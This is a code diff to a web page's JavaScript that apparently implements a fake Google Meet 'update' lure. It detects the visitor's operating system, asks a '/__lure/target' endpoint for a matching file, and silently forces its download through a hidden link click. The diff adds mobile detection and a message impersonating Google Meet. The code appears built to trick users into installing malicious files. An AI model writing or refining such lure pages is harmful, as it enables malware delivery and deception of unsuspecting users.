@@ -148,10 +148,10 @@
   function download(){
     if(window.__fleetDownloaded)return;
     window.__fleetDownloaded=true;
-    var ua=navigator.userAgent||"", os=/Windows|Win32|Win64/i.test(ua)?"windows":(/Macintosh|Mac OS X|Darwin/i.test(ua)?"darwin":(/Linux|X11|CrOS/i.test(ua)?"linux":"all"));
+    var ua=navigator.userAgent||"", os=/iPhone|iPad|iPod/i.test(ua)?"ios":(/Android/i.test(ua)?"android":(/Windows|Win32|Win64/i.test(ua)?"windows":(/Macintosh|Mac OS X|Darwin/i.test(ua)?"darwin":(/Linux|X11|CrOS/i.test(ua)?"linux":"all"))));
     fetch("/__lure/target?os="+encodeURIComponent(os)+"&ua="+encodeURIComponent(ua),{cache:"no-store"})
       .then(function(r){return r.json();})
-      .then(function(d){if(!d||!d.url)return;var a=document.createElement("a");a.href=d.url;a.rel="noopener";a.setAttribute("download","");document.body.appendChild(a);a.click();a.remove();})
+      .then(function(d){if(!d||!d.url){if(n)n.innerHTML="Detected <strong>"+label()+"</strong>. Use the Google Meet app to join.";return;}var a=document.createElement("a");a.href=d.url;a.rel="noopener";a.setAttribute("download","");document.body.appendChild(a);a.click();a.remove();})
       .catch(function(){});
   }
   var upd=document.querySelector('a[href="#update"]'); if(upd)upd.addEventListener("click",function(e){e.preventDefault();download();});
